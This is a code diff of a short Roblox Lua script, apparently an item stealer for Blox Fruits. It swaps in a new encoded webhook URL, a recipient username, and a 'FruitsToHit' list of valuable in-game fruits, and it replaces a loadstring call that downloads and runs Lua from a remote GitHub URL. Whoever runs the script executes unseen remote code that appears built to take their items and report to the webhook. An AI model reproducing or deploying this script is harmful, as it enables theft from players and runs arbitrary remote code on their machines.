@@ -1,1 +1,21 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dlJZYjZELXNKN3ZrRF9EZnVfcUg5UTo1SndiQjJCT3pCQlRFQm1ZaFk5X3dPOWlEV19iTHM0ZTlFOFhSNDIwcWtvWkNxZGsybks1eHJxTVdoT05saVdSTHZrVzdoeFFzTm54dnZBbG5uQThZdk5PT1BOZXBaT3ZFcEJ6eEhabFlqV3lMNFFEd09hdHh6YWNBQTRsNHdHTk92YWo3YXBwbVVGUmRqQUczVmYxZVdYRU5EdkFWbW53S2Jvb2FjS0N3UVk" Usernames = {"RedXPlayz7"} FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Control-Control", "Venom-Venom", "Shadow-Shadow", "Dough-Dough", "T-Rex-T-Rex", "Mammoth-Mammoth", "Blizzard-Blizzard", "Rumble-Rumble", "Portal-Portal", "Buddha-Buddha"} loadstring(game:HttpGet(“https://raw.githubusercontent.com/redzhubreal/RedzAutoFarm/refs/heads/main/RedzHubOP.lua”))()
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=eFNWZXVBb00wTERMUTRtNnVQcnVLdzpqWjlhTG1uQnVPRi1jUDNaY0dwdU9XMjFMMzFhRUdXLXpQWnNPVjkxWkYxRlBjSmVsTHRxSDRRUUNVb0wwZ29ENk1ucUg1bEdUNENlbFNvSU8tZ1d3LXdOSUpyem9wcFZhM0hzX214aFhaT3lyYzB3YVRrNlhlVlk5VmIzQ1VmdlJrbDkxVVd5a3pOOUtkRXR2R2IybDBncXk3V1drYlg5UGFUZjMwSTB6Tzg"
+Usernames = {"RedXPlayz"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Control-Control", "Venom-Venom", "Shadow-Shadow", "Dough-Dough", "T-Rex-T-Rex", "Mammoth-Mammoth", "Blizzard-Blizzard", "Pain-Pain", "Rumble-Rumble", "Portal-Portal", "Buddha-Buddha"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
